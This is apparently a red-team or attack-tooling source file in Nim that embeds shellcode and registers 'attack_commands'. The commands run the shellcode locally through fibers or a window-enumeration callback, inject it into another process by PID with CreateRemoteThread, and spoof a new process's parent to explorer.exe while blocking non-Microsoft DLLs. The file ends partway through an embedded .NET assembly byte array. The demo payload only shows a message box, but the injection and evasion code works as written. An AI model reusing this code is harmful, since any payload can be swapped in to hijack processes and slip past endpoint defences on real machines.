import winim/clr
var shellcode: array[316, byte] = [byte 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 
0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 
0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 
0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 
0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 
0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 
0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 
0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41, 0x8b, 0x0c, 
0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 
0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 
0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x40, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 
0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x29, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 
0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 
0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x53, 0x43, 0x4f, 0x44, 0x45, 0x5f, 0x45, 
0x58, 0x45, 0x43, 0x55, 0x54, 0x45, 0x44, 0x00, 0x53, 0x43, 0x4f, 0x44, 0x45, 0x00]


proc msgbox_fiber() {.thread.} =
  var mainFiber = ConvertThreadToFiber(nil)
  var shellcodeLocation = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE);
  
  CopyMemory(shellcodeLocation, &shellcode[0], shellcode.len);
  var shellcodeFiber = CreateFiber(cast[SIZE_T](0), cast[LPFIBER_START_ROUTINE](shellcodeLocation), NULL);
  var oldprotect: ULONG
  VirtualProtect(shellcodeLocation, cast[SIZE_T](shellcode.len), PAGE_EXECUTE_READ, &oldprotect)
  
  
  SwitchToFiber(shellcodeFiber);


proc msgbox_callback() {.thread.} =
  var mycodeLocation = VirtualAlloc(nil, cast[SIZE_T](shellcode.len*2), MEM_COMMIT, PAGE_READWRITE);
  CopyMemory(mycodeLocation, &shellcode[0], shellcode.len);
  var oldprotect: ULONG
  VirtualProtect(mycodeLocation, cast[SIZE_T](shellcode.len), PAGE_EXECUTE_READ, &oldprotect)
  
  EnumChildWindows(cast[HWND](nil),cast[WNDENUMPROC](mycodeLocation),0x0)


proc local_inject(args: string) =
  if args == "callback":
    var t: Thread[void]
    t.createThread(msgbox_callback)    
    joinThread(t)
  elif args == "fibers":
    var t: Thread[void]
    t.createThread(msgbox_fiber)    
    joinThread(t)

var attack_commands = {"local_inject": local_inject}.toTable
var attack_help = {"local_inject": "execute msgbox locally\n\t\t\tfibers -- crashes the process afterwards\n\t\t\tcallback -- execute via callback"}.toTable



proc crt_inject(args: string) =
  var pid = parseInt(args)
  let pHandle = OpenProcess(
    PROCESS_ALL_ACCESS, 
    false, 
    cast[DWORD](pid)
  )
  echo " ! process opened with pid", pid
  var oldprotect: DWORD

  let base_addr = VirtualAllocEx(
    pHandle,
    NULL,
    cast[SIZE_T](shellcode.len),
    MEM_COMMIT,
    PAGE_READWRITE
  )
  echo " ! VirtualAllocEx to ", toHex(cast[int](base_addr))
  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(
    pHandle, 
    base_addr,
    unsafeAddr shellcode,
    cast[SIZE_T](shellcode.len),
    addr bytesWritten
  )
  echo " ! ", bytesWritten," bytes written"
  let pSuccess = VirtualProtectEx(
    pHandle,
    base_addr,
    cast[SIZE_T](shellcode.len),
    PAGE_EXECUTE_READ,
    &oldprotect
  )
  echo " ! VirtualProtectEx to RX ", GetLastError()
  let tHandle = CreateRemoteThread(
      pHandle, 
      NULL,
      0,
      cast[LPTHREAD_START_ROUTINE](base_addr),
      NULL, 
      0, 
      NULL
  )
  echo " ! CreateRemoteThread ", GetLastError()
attack_commands["crt_inject"] = crt_inject
attack_help["crt_inject"] = "execute msgbox remotely with CreateRemoteThread\n\t\t\targs = pid"


const
  PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
  PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x00000003 shl 44 #Gr33tz to @_RastaMouse ;)
  PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x00000001 shl 36

proc toString(chars: openArray[WCHAR]): string =
  result = ""
  for c in chars:
    if cast[char](c) == '\0':
      break
    result.add(cast[char](c))

proc GetProcessByName(process_name: string): DWORD =
  var
    pid: DWORD = 0
    entry: PROCESSENTRY32
    hSnapshot: HANDLE

  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  defer: CloseHandle(hSnapshot)

  if Process32First(hSnapshot, addr entry):
    while Process32Next(hSnapshot, addr entry):
      if entry.szExeFile.toString == process_name:
        pid = entry.th32ProcessID
        break

  return pid

proc ppid_spoof(args: string) =
  var
    si: STARTUPINFOEX
    pi: PROCESS_INFORMATION
    ps: SECURITY_ATTRIBUTES
    ts: SECURITY_ATTRIBUTES
    policy: DWORD64
    lpSize: SIZE_T
    res: WINBOOL

  si.StartupInfo.cb = sizeof(si).cint
  ps.nLength = sizeof(ps).cint
  ts.nLength = sizeof(ts).cint

  InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)

  si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))

  InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

  policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE or PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON

  res = UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
    addr policy,
    sizeof(policy),
    NULL,
    NULL
  )

  var processId = GetProcessByName("explorer.exe")
  echo fmt" ! Found explorer PPID: {processId}"
  var parentHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)

  res = UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
    addr parentHandle,
    sizeof(parentHandle),
    NULL,
    NULL
  )

  res = CreateProcess(
    NULL,
    newWideCString(r"C:\Windows\notepad.exe"),
    ps,
    ts, 
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
    NULL,
    NULL,
    addr si.StartupInfo,
    addr pi
  )

  echo fmt" ! Started process with PID: {pi.dwProcessId}"
  
attack_commands["ppid_spoof"] = ppid_spoof
attack_help["ppid_spoof"] = "create suspended notepad process with PPID spoofing to explorer\n\t\t\t"


var test_assembly: array[3584, byte] = [byte 0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x0e, 0x1f, 0xba, 0x0e, 0x00, 0xb4, 0x09, 0xcd, 0x21, 0xb8, 0x01, 0x4c, 0xcd, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x20, 0x63, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6e, 0x20, 0x69, 0x6e, 0x20, 0x44, 0x4f, 0x53, 0x20, 0x6d, 0x6f, 0x64, 0x65, 0x2e, 0x0d, 0x0d, 0x0a, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x4c, 0x01, 0x03, 0x00, 0x96, 0xca, 0xdd, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x00, 0x02, 0x01, 0x0b, 0x01, 0x0b, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xee, 0x23, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x40, 0x85, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c, 0x23, 0x00, 0x00, 0x4f, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xd0, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x20, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0xf4, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x2e, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00, 0xd0, 0x04, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2e, 0x72, 0x65, 0x6c, 0x6f, 0x63, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05, 0x00, 0xa4, 0x20, 0x00, 0x00, 0xf8, 0x02, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x30, 0x05, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x11, 0x00, 0x72, 0x01, 0x00, 0x00, 0x70, 0x28, 0x03, 0x00, 0x00, 0x0a, 0x00, 0x16, 0x0a, 0x2b, 0x24, 0x00, 0x72, 0x17, 0x00, 0x00, 0x70, 0x06, 0x28, 0x04, 0x00, 0x00, 0x0a, 0x72, 0x35, 0x00, 0x00, 0x70, 0x02, 0x06, 0x9a, 0x28, 0x05, 0x00, 0x00, 0x0a, 0x28, 0x03, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x06, 0x17, 0x58, 0x0a, 0x06, 0x02, 0x8e, 0x69, 0xfe, 0x04, 0x0b, 0x07, 0x2d, 0xd2, 0x2a, 0x1e, 0x02, 0x28, 0x06, 0x00, 0x00, 0x0a, 0x2a, 0x00, 0x42, 0x53, 0x4a, 0x42, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x76, 0x34, 0x2e, 0x30, 0x2e, 0x33, 0x30, 0x33, 0x31, 0x39, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x6c, 0x00, 0x00, 0x00, 0x0c, 0x01, 0x00, 0x00, 0x23, 0x7e, 0x00, 0x00, 0x78, 0x01, 0x00, 0x00, 0xd8, 0x00, 0x00, 0x00, 0x23, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x00, 0x00, 0x00, 0x50, 0x02, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x23, 0x55, 0x53, 0x00, 0x90, 0x02, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x23, 0x47, 0x55, 0x49, 0x44, 0x00, 0x00, 0x00, 0xa0, 0x02, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x23, 0x42, 0x6c, 0x6f, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x01, 0x47, 0x15, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0xfa, 0x25, 0x33, 0x00, 0x16, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x29, 0x00, 0x22, 0x00, 0x06, 0x00, 0x60, 0x00, 0x40, 0x00, 0x06, 0x00, 0x80, 0x00, 0x40, 0x00, 0x06, 0x00, 0xa4, 0x00, 0x22, 0x00, 0x06, 0x00, 0xb6, 0x00, 0x22, 0x00, 0x06, 0x00, 0xc7, 0x00, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x10, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x01, 0x00, 0x01, 0x00, 0x50, 0x20, 0x00, 0x00, 0x00, 0x00, 0x96, 0x00, 0x30, 0x00, 0x0a, 0x00, 0x01, 0x00, 0x9b, 0x20, 0x00, 0x00, 0x00, 0x00, 0x86, 0x18, 0x35, 0x00, 0x10, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x3b, 0x00, 0x11, 0x00, 0x35, 0x00, 0x14, 0x00, 0x19, 0x00, 0x35, 0x00, 0x10, 0x00, 0x21, 0x00, 0xac, 0x00, 0x19, 0x00, 0x29, 0x00, 0xbe, 0x00, 0x1e, 0x00, 0x31, 0x00, 0xce, 0x00, 0x23, 0x00, 0x09, 0x00, 0x35, 0x00, 0x10, 0x00, 0x2e, 0x00, 0x0b, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x13, 0x00, 0x39, 0x00, 0x2b, 0x00, 0x04, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9e, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x3e, 0x00, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x54, 0x65, 0x73, 0x74, 0x00, 0x6d, 0x73, 0x63, 0x6f, 0x72, 0x6c, 0x69, 0x62, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x00, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00, 0x4d, 0x61, 0x69, 0x6e, 0x00, 0x2e, 0x63, 0x74, 0x6f, 0x72, 0x00, 0x61, 0x72, 0x67, 0x73, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2e, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x2e, 0x43, 0x6f, 0x6d, 0x70, 0x69, 0x6c, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x00, 0x43, 0x6f, 0x6d, 0x70, 0x69, 0x6c, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x52, 0x65, 0x6c, 0x61, 0x78, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x43, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x69, 0x6c, 0x69, 0x74, 0x79, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x00, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x00, 0x57, 0x72, 0x69, 0x74, 0x65, 0x4c, 0x69, 0x6e, 0x65, 0x00, 0x43, 0x6f, 0x6e, 0x76, 0x65, 0x72, 0x74, 0x00, 0x54, 0x6f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x43, 0x6f, 0x6e, 0x63, 0x61, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x15, 0x2e, 0x00, 0x4e, 0x00, 0x45, 0x00, 0x54, 0x00, 0x7c, 0x00, 0x20, 0x00, 0x68, 0x00, 0x65, 0x00, 0x79, 0x00, 0x21, 0x00, 0x00, 0x1d, 0x2e, 0x00, 0x4e, 0x00, 0x45, 0x00, 0x54, 0x00, 0x7c, 0x00, 0x20, 0x00, 0x61, 0x00, 0x72, 0x00, 0x67, 0x00, 0x75, 0x00, 0x6d, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x00, 0x07, 0x20, 0x00, 0x3d, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd5, 0x6e, 0xd4, 0xc0, 0xde, 0x7b, 0x21, 0x44, 0x88, 0x2f, 0x17, 0x47, 0x50, 0x57, 0x3d, 0xf9, 0x00, 0x08, 0xb7, 0x7a, 0x5c, 0x56, 0x19, 0x34, 0xe0, 0x89, 0x05, 0x00, 0x01, 0x01, 0x1d, 0x0e, 0x03, 0x20, 0x00, 0x01, 0x04, 0x20, 0x01, 0x01, 0x08, 0x04, 0x00, 0x01, 0x01, 0x0e, 0x04, 0x00, 0x01, 0x0e, 0x08, 0x07, 0x00, 0x04, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x04, 0x07, 0x02, 0x08, 0x02, 0x08, 0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1e, 0x01, 0x00, 0x01, 0x00, 0x54, 0x02, 0x16, 0x57, 0x72, 0x61, 0x70, 0x4e, 0x6f, 0x6e, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x54, 0x68, 0x72, 0x6f, 0x77, 0x73, 0x01, 0xc4, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xde, 0x23, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5f, 0x43, 0x6f, 0x72, 0x45, 0x78, 0x65, 0x4d, 0x61, 0x69, 0x6e, 0x00, 0x6d, 0x73, 0x63, 0x6f, 0x72, 0x65, 0x65, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0x25, 0x00, 0x20, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x10, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x80, 0x18, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0xa0, 0x40, 0x00, 0x00, 0x3c, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x42, 0x00, 0x00, 0xea, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x02, 0x34, 0x00, 0x00, 0x00, 0x56, 0x00, 0x53, 0x00, 0x5f, 0x00, 0x56, 0x00, 0x45, 0x00, 0x52, 0x00, 0x53, 0x00, 0x49, 0x00, 0x4f, 0x00, 0x4e, 0x00, 0x5f, 0x00, 0x49, 0x00, 0x4e, 0x00, 0x46, 0x00, 0x4f, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbd, 0x04, 0xef, 0xfe, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x01, 0x00, 0x56, 0x00, 0x61, 0x00, 0x72, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6e, 0x00, 0x66, 0x00, 0x6f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x04, 0x00, 0x00, 0x00, 0x54, 0x00, 0x72, 0x00, 0x61, 0x00, 0x6e, 0x00, 0x73, 0x00, 0x6c, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb0, 0x04, 0x9c, 0x01, 0x00, 0x00, 0x01, 0x00, 0x53, 0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x67, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6e, 0x00, 0x66, 0x00, 0x6f, 0x00, 0x00, 0x00, 0x78, 0x01, 0x00, 0x00, 0x01, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x34, 0x00, 0x62, 0x00, 0x30, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x02, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x44, 0x00, 0x65, 0x00, 0x73, 0x00, 0x63, 0x00, 0x72, 0x00, 0x69, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x30, 0x00, 0x08, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00, 0x34, 0x00, 0x0a, 0x00, 0x01, 0x00, 0x49, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6e, 0x00, 0x61, 